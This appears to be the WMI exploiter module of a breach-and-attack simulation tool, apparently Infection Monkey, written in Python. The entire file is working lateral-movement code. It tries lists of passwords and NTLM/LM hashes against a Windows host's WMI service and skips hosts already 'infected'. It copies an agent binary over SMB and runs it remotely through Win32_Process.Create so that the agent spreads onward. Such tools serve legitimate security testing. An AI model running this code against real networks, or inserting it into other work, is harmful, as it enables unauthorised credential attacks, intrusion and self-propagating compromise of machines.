import logging
import ntpath
import socket
import traceback

from impacket.dcerpc.v5.rpcrt import DCERPCException

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import (build_monkey_commandline,
                                                    get_monkey_depth,
                                                    get_target_monkey)
from infection_monkey.exploit.tools.smb_tools import SmbTools
from infection_monkey.exploit.tools.wmi_tools import (AccessDeniedException,
                                                      WmiTools)
from infection_monkey.model import (DROPPER_CMDLINE_WINDOWS,
                                    MONKEY_CMDLINE_WINDOWS)

LOG = logging.getLogger(__name__)


class WmiExploiter(HostExploiter):
    _TARGET_OS_TYPE = ['windows']
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = 'WMI (Windows Management Instrumentation)'
    VULNERABLE_PORT = 135

    def __init__(self, host):
        super(WmiExploiter, self).__init__(host)

    @WmiTools.dcom_wrap
    def _exploit_host(self):
        src_path = get_target_monkey(self.host)

        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        creds = self._config.get_exploit_user_password_or_hash_product()

        for user, password, lm_hash, ntlm_hash in creds:
            password_hashed = self._config.hash_sensitive_data(password)
            lm_hash_hashed = self._config.hash_sensitive_data(lm_hash)
            ntlm_hash_hashed = self._config.hash_sensitive_data(ntlm_hash)
            creds_for_logging = "user, password (SHA-512), lm hash (SHA-512), ntlm hash (SHA-512): " \
                                "({},{},{},{})".format(user, password_hashed, lm_hash_hashed, ntlm_hash_hashed)
            LOG.debug(("Attempting to connect %r using WMI with " % self.host) + creds_for_logging)

            wmi_connection = WmiTools.WmiConnection()

            try:
                wmi_connection.connect(self.host, user, password, None, lm_hash, ntlm_hash)
            except AccessDeniedException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                LOG.debug(("Failed connecting to %r using WMI with " % self.host) + creds_for_logging)
                continue
            except DCERPCException:
                self.report_login_attempt(False, user, password, lm_hash, ntlm_hash)
                LOG.debug(("Failed connecting to %r using WMI with " % self.host) + creds_for_logging)
                continue
            except socket.error:
                LOG.debug(("Network error in WMI connection to %r with " % self.host) + creds_for_logging)
                return False
            except Exception as exc:
                LOG.debug(
                    ("Unknown WMI connection error to %r with " % self.host)
                    + creds_for_logging
                    + (" (%s):\n%s" % (exc, traceback.format_exc()))
                )
                return False

            self.report_login_attempt(True, user, password, lm_hash, ntlm_hash)

            # query process list and check if monkey already running on victim
            process_list = WmiTools.list_object(wmi_connection, "Win32_Process",
                                                fields=("Caption",),
                                                where="Name='%s'" % ntpath.split(src_path)[-1])
            if process_list:
                wmi_connection.close()

                LOG.debug("Skipping %r - already infected", self.host)
                return False

            # copy the file remotely using SMB
            remote_full_path = SmbTools.copy_file(self.host,
                                                  src_path,
                                                  self._config.dropper_target_path_win_32,
                                                  user,
                                                  password,
                                                  lm_hash,
                                                  ntlm_hash,
                                                  self._config.smb_download_timeout)

            if not remote_full_path:
                wmi_connection.close()
                return False
            # execute the remote dropper in case the path isn't final
            elif remote_full_path.lower() != self._config.dropper_target_path_win_32.lower():
                cmdline = DROPPER_CMDLINE_WINDOWS % {'dropper_path': remote_full_path} + \
                          build_monkey_commandline(self.host,
                                                   get_monkey_depth() - 1,
                                                   WmiExploiter.VULNERABLE_PORT,
                                                   self._config.dropper_target_path_win_32)
            else:
                cmdline = MONKEY_CMDLINE_WINDOWS % {'monkey_path': remote_full_path} + \
                          build_monkey_commandline(self.host,
                                                   get_monkey_depth() - 1,
                                                   WmiExploiter.VULNERABLE_PORT)

            # execute the remote monkey
            result = WmiTools.get_object(wmi_connection, "Win32_Process").Create(cmdline,
                                                                                 ntpath.split(remote_full_path)[0],
                                                                                 None)

            if (0 != result.ProcessId) and (not result.ReturnValue):
                LOG.info("Executed dropper '%s' on remote victim %r (pid=%d, cmdline=%r)",
                         remote_full_path, self.host, result.ProcessId, cmdline)

                self.add_vuln_port(port='unknown')
                success = True
            else:
                LOG.debug("Error executing dropper '%s' on remote victim %r (pid=%d, exit_code=%d, cmdline=%r)",
                          remote_full_path, self.host, result.ProcessId, result.ReturnValue, cmdline)
                success = False

            result.RemRelease()
            wmi_connection.close()
            self.add_executed_cmd(cmdline)
            return success

        return False
